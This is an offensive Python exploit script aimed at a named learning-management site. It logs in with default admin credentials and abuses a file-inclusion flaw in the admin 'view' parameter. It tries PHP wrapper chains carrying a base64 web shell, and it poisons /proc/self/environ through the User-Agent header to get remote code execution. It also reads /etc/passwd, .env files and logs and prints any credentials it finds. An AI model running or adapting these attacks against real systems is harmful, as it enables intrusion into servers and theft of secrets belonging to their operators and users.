import requests
import re
import base64
import urllib.parse

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()
session.timeout = 15

def login():
    print("[*] Logging in...")
    r = session.get(f"{BASE_URL}/admin/login")
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
    session.post(f"{BASE_URL}/admin/login", data={"_token": csrf, "email": ADMIN_EMAIL, "password": ADMIN_PASS})
    print("[+] Logged in")

def test_php_wrappers():
    """Test PHP wrapper chains for RCE via LFI"""
    print("\n" + "="*60)
    print("    PHP WRAPPER CHAINS - RCE WITHOUT FILE WRITE")
    print("="*60)
    
    # Base64 encoded: <?php system($_GET[0]); ?>
    b64_shell = "PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4="
    
    wrappers = [
        # data:// wrapper (if allow_url_include=On)
        f"data://text/plain;base64,{b64_shell}",
        f"data:text/plain;base64,{b64_shell}",
        
        # php://input wrapper (POST body executed as PHP)
        "php://input",
        
        # expect:// wrapper (command execution)
        "expect://id",
        
        # php://filter with resource
        f"php://filter/convert.base64-decode/resource=data://text/plain;base64,{b64_shell}",
        
        # phar:// wrapper (if we can upload a file)
        # "phar://uploaded.jpg/shell.php",
    ]
    
    # Try each wrapper
    for wrapper in wrappers:
        encoded = urllib.parse.quote(wrapper)
        test_url = f"{BASE_URL}/admin?view={encoded}"
        
        print(f"\n[*] Testing: {wrapper[:50]}...")
        
        try:
            if wrapper == "php://input":
                # For php://input, send payload in POST body
                r = session.post(test_url, data="<?php system('id'); ?>")
            else:
                r = session.get(test_url)
            
            print(f"    Status: {r.status_code}, Length: {len(r.text)}")
            
            if "uid=" in r.text:
                print(f"\n[!!!] RCE SUCCESS with {wrapper}!")
                match = re.search(r'(uid=\d+[^\n<]+)', r.text)
                if match:
                    print(f"[!!!] Output: {match.group(1)}")
                return wrapper
            
            # Check for any interesting output
            if "<?php" in r.text[:1000] and wrapper.startswith("data"):
                print("    [!] PHP code reflected but not executed")
            
        except Exception as e:
            print(f"    Error: {e}")
    
    return None

def test_alternate_lfi_paths():
    """Test different file paths via LFI"""
    print("\n" + "="*60)
    print("    TESTING ALTERNATE LFI PATHS")
    print("="*60)
    
    # Files that might exist and be interesting
    paths = [
        # Config files with sensitive data
        "/etc/passwd",
        "../.env",
        "../../.env",
        "../../../.env",
        "../../../../.env",
        "/var/www/html/.env",
        "/var/www/lms/.env",
        
        # PHP session files (may contain serialized data)
        "/tmp/sess_PHPSESSID",
        "/var/lib/php/sessions/sess_PHPSESSID",
        
        # Process substitution
        "/proc/self/environ",
        "/proc/self/fd/0",
        
        # Other logs
        "/var/log/mail.log",
        "/var/log/auth.log",
    ]
    
    for path in paths:
        try:
            encoded = urllib.parse.quote(path)
            test_url = f"{BASE_URL}/admin?view={encoded}"
            r = session.get(test_url, timeout=10)
            
            # Check for interesting content
            if r.status_code == 200 and len(r.text) > 1000:
                if "root:" in r.text:  # /etc/passwd
                    print(f"[+] {path}: /etc/passwd found!")
                    print(r.text[:500])
                    return path
                elif "APP_KEY=" in r.text or "DB_PASSWORD=" in r.text:
                    print(f"[+] {path}: .env file found!")
                    # Extract credentials
                    lines = [l for l in r.text.split('\n') if 'PASSWORD' in l or 'KEY' in l]
                    for line in lines[:5]:
                        print(f"    {line.strip()}")
                    return path
                    
        except:
            pass
    
    return None

def test_proc_environ_poison():
    """Try to poison /proc/self/environ for RCE"""
    print("\n" + "="*60)
    print("    /PROC/SELF/ENVIRON POISONING")
    print("="*60)
    
    # Inject PHP into environment via User-Agent
    php_payload = "<?php system($_GET['c']); ?>"
    headers = {"User-Agent": php_payload}
    
    # Test if /proc/self/environ is accessible
    test_url = f"{BASE_URL}/admin?view=/proc/self/environ&c=id"
    
    try:
        r = session.get(test_url, headers=headers)
        print(f"    Status: {r.status_code}, Length: {len(r.text)}")
        
        if "uid=" in r.text:
            print("[!!!] RCE via /proc/self/environ!")
            return True
        elif "HTTP_USER_AGENT" in r.text:
            print("[+] /proc/self/environ accessible")
            if "<?php" in r.text:
                print("[!] PHP in environ but not executed (included as text)")
                
    except Exception as e:
        print(f"    Error: {e}")
    
    return False

def main():
    login()
    
    # Test PHP wrappers 
    shell = test_php_wrappers()
    if shell:
        print(f"\n[+] Found working wrapper: {shell}")
        return
    
    # Test /proc/self/environ
    if test_proc_environ_poison():
        return
    
    # Test alternate paths
    test_alternate_lfi_paths()
    
    print("\n" + "="*60)
    print("    SUMMARY")
    print("="*60)
    print("[*] LFI confirmed but PHP wrappers blocked/disabled")
    print("[*] Server likely has:")
    print("    - allow_url_include = Off")
    print("    - data:// and expect:// wrappers disabled")
    print("[*] Need to find a way to write or control a PHP file")

if __name__ == "__main__":
    main()
